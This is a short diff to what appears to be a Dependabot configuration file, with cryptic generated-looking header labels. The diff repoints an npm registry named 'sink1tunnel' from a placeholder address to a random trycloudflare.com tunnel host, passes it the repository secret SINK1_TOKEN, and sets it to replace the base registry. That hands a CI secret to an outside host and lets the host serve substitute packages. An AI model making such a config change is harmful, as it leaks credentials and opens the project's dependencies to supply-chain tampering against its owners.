@@ -1,9 +1,9 @@
-# p7r p15b_ex9 1790632578
+# p7r p13a_13_5 1790632930
 version: 2
 registries:
   sink1tunnel:
     type: npm-registry
-    url: http://example.com:9/
+    url: http://rand-terms-bytes-subsidiaries.trycloudflare.com:8888/
     token: ${{secrets.SINK1_TOKEN}}
     replaces-base: true
 updates:
